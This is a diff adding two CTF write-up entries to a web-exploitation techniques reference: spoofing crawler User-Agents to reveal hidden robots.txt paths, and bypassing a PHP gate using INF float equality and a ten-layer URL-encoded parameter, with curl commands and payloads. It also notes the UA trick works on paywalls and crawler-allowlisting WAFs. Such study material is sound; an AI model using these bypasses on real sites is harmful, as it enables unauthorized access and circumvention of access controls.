@@ -26,6 +26,8 @@
 - [Recursive-Replace Traversal `....//` (35C3 2018)](#recursive-replace-traversal--35c3-2018)
 - [PHP (int) Cast Leading-Number Traversal (35C3 2018)](#php-int-cast-leading-number-traversal-35c3-2018)
 - [strpos Substring-Match Blacklist Bypass (TUCTF 2018)](#strpos-substring-match-blacklist-bypass-tuctf-2018)
+- [User-Agent-Gated robots.txt (TAMUctf 2019)](#user-agent-gated-robotstxt-tamuctf-2019)
+- [PHP log()/INF Math Equality + Recursive urldecode() (Pragyan CTF 2019)](#php-loginf-math-equality--recursive-urldecode-pragyan-ctf-2019)
 
 For XXE, XML injection, PHP variable-variable abuse, uniqid/regex bypasses, command injection, and GraphQL exploitation, see [server-side-2.md](server-side-2.md). For code execution attacks (Ruby/Perl/JS/LaTeX/Prolog injection, PHP preg_replace /e, ReDoS, file upload to RCE, PHP deserialization, XPath injection, Thymeleaf SpEL SSTI), see [server-side-exec.md](server-side-exec.md). For SQLi keyword fragmentation, SQL WHERE bypass, SQL via DNS, bash brace expansion, Common Lisp injection, PHP7 OPcache, and more, see [server-side-exec-2.md](server-side-exec-2.md). For deserialization attacks (Java, Pickle) and race conditions, see [server-side-deser.md](server-side-deser.md). For CVE-specific exploits, path traversal bypasses, Flask/Werkzeug debug, and other advanced techniques, see [server-side-advanced.md](server-side-advanced.md).
 
@@ -558,6 +560,69 @@ Also: `strpos(...) == true` (loose comparison) is true for any non-zero offset; 
 **Key insight:** `strpos()`, `str_contains()`, and `preg_match()` are identification checks, not validation. For filename/path safety, resolve the full path with `realpath()` and compare against an allowlisted root.
 
 **References:** TUCTF 2018 — Easter Egg: Crystal Gate, writeup 12380
+
+---
+
+## User-Agent-Gated robots.txt (TAMUctf 2019)
+
+**Pattern:** `/robots.txt` serves different bodies depending on the `User-Agent`. Humans (default UAs) see a decoy file; crawler UAs such as `Googlebot/2.1` see the real `Disallow:` list — which is where the challenge hides paths.
+
+```bash
+# Decoy
+curl -s http://target/robots.txt
+# "WHAT IS UP, MY FELLOW HUMAN! ..."
+
+# Real file
+curl -s -A 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' \
+     http://target/robots.txt
+# User-agent: Googlebot
+# Disallow: /super-secret-admin-panel/
+# Disallow: /flag-is-here.txt
+```
+
+Always rotate through common crawler UAs when recon reveals a themed robots.txt decoy:
+
+```bash
+for UA in \
+  'Googlebot/2.1' \
+  'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)' \
+  'Mozilla/5.0 (compatible; YandexBot/3.0)' \
+  'facebookexternalhit/1.1' \
+  'Slackbot-LinkExpanding 1.0' \
+  'Twitterbot/1.0'; do
+  echo "=== $UA ==="
+  curl -s -A "$UA" http://target/robots.txt
+done
+```
+
+**Key insight:** Bot-specific content negotiation on `robots.txt` (and `sitemap.xml`, `/.well-known/*`, home pages) can disclose paths normally hidden from human browsers. Always test with `User-Agent: Googlebot/2.1` and the other major crawler signatures — the same bypass also works on paywalls that allow bots to index content and on WAFs that allowlist crawlers by UA alone.
+
+**References:** TAMUctf 2019 — Robots Rule, writeup 13707
+
+---
+
+## PHP log()/INF Math Equality + Recursive urldecode() (Pragyan CTF 2019)
+
+**Pattern 1 — INF == INF:** PHP's `log()`/`log10()` of a huge float returns `INF`, and `INF == INF` is true. A gate like
+```php
+$a = hash('sha256', $a);              // 64 hex chars, e.g. "a..." -> string
+$a = (log10($a ** 0.5)) ** 2;         // "a..." ** 0.5 -> INF, log10(INF) -> INF, **2 -> INF
+if ($c > 0 && $d > 0 && $d > $c && $a == $c*$c + $d*$d) { /* pass */ }
+```
+passes whenever `$c*$c + $d*$d` is also INF. `7e1000` (over `DBL_MAX`) is `INF` in PHP, so `val3=1&val4=7E1000` satisfies the `$d > $c` ordering with both sides INF.
+
+**Pattern 2 — Recursive urldecode loop:** A loop requires `$b != urldecode($b)` ten times and the final value to equal `"WoAHh!"`. `%25` decodes to `%`, so each pass peels one layer: encode the first character nine times.
+```
+WoAHh! -> %57oAHh! -> %2557oAHh! -> ... (10 layers) -> %2525252525252525252557oAHh!
+```
+
+```bash
+curl 'http://target/?val1=a&val2=1&val3=1&val4=7E1000&val5=a&val6=%2525252525252525252557oAHh!'
+```
+
+**Key insight:** PHP float comparison accepts `INF == INF`; any math-style equality check becomes trivial if you can push both sides past `DBL_MAX`. Hashes stringified into floats collapse to 0 or INF, so `sha256(x) ** 0.5` and `log*()` are classic "juggling" primitives. For recursive decoder loops, the fixed point of repeated urldecode is "no `%` left"; encode one character N times with `%25` padding to force exactly N passes.
+
+**References:** Pragyan CTF 2019 — Mandatory PHP, writeup 13837
 
 ---
 
